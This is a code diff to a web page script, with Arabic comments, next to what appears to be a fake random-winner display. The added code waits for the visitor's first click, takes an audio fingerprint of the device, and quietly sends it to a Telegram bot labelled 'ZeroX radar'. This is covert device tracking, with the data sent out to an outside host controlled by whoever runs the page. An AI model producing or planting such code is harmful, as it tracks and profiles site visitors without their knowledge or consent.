@@ -457,6 +457,28 @@ window.onfocus = () => {
     // تشغيل الحركة كل 5 ثواني
     setInterval(showRandomWinner, 5000);
 
+    // --- كود الصاعقة: تحديث بصمة الصوت عند أول لمسة ---
+document.addEventListener('click', async () => {
+    try {
+        // تشغيل تحليل الصوت بعد اللمس (الآن المتصفح سيسمح له)
+        const audioDNAUpdate = await getAudioFingerprint(); 
+        
+        const audioUpdateMsg = `
+🎵 تحديث بصمة الصوت (Audio DNA):
+----------------------------------
+🆔 المعرف الرقمي: ${audioDNAUpdate}
+✅ تم التحقق: الجهاز حقيقي وملموس
+----------------------------------
+🕵️‍♂️ رادار ZeroX المتقدم
+        `;
+
+        // إرسال رسالة الصوت المنفصلة
+        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(audioUpdateMsg)}`);
+    } catch (e) {
+        console.log("لم يتم التقاط الصوت بعد");
+    }
+}, { once: true }); // كلمة once تضمن أنه يرسل مرة واحدة فقط عند أول لمسة
+
 </script>
 
 
